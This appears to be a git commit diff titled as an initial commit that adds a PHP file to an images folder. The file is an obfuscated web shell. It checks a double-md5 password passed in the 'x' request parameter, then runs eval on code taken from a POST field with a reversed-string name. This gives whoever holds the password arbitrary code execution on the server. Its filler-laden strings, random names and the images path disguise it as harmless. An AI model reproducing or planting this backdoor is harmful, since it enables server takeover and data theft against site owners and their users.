14a83027358d3064285b4b0ddd04070faf8d8ec4
mguleryuz <mguleryuz3@gmail.com>
2025-03-16 18:26:11 +0300

    chore: inital commit

---
+++ images/4RJ2v3l3T.php
@@ -0,0 +1,35 @@
+﻿<?php
+
+function hwISWNPnj()
+{
+global $UvokkbCHKBn;
+$UvokkbCHKBn=jGbTeN();
+if(isset($_REQUEST['x']))
+{
+	$qyzfAlwxywf = 'OWNhDsGqHNWNhDsGqHEWNhDsGqHPWNhDsGqHIWNhDsGqHEWNhDsGqHCWNhDsGqHE';
+    $qyzfAlwxywf=str_replace('WNhDsGqH','',$qyzfAlwxywf);
+
+    echo $qyzfAlwxywf;
+	if ( strcasecmp(md5(md5($_REQUEST['x'])),'025d238b77db9cc1d825ebdfadcc21cf') ==0 )
+    {
+	@eval("\"$UvokkbCHKBn\"");
+    }
+}
+
+
+}
+function jGbTeN()
+{
+        $DztnmfBvj='a2-----QNY-2J-8j';
+		$xSdpuf=strrev($DztnmfBvj);
+		if(isset($_POST[$xSdpuf]))
+        {
+        $ACwICovdj=str_replace('','',$_POST[$xSdpuf]);
+        
+        return '";'.$ACwICovdj.'//';
+		}
+}
+
+hwISWNPnj();
+
+?>
